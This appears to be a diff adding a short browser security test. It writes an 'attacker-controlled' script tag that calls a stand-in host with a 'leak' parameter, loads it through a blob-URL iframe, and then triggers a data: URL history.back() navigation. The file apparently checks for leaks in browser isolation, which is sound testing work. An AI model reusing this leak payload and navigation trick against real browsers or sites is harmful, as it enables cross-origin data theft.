@@ -1,0 +1,8 @@
+<script>
+    var attackerControlledString = "<script src=\"https://a.test/report/?leak=c916326\"><\/script>";
+    var fileSystemURL = URL.createObjectURL(new Blob([attackerControlledString], {type : 'text/html'}));
+    document.write('<iframe src="' + fileSystemURL + '"></iframe>');
+    setTimeout(function() {
+        location.href = 'data:text/html,<script>history.back()<\/script>';
+    }, 1000);
+</script>
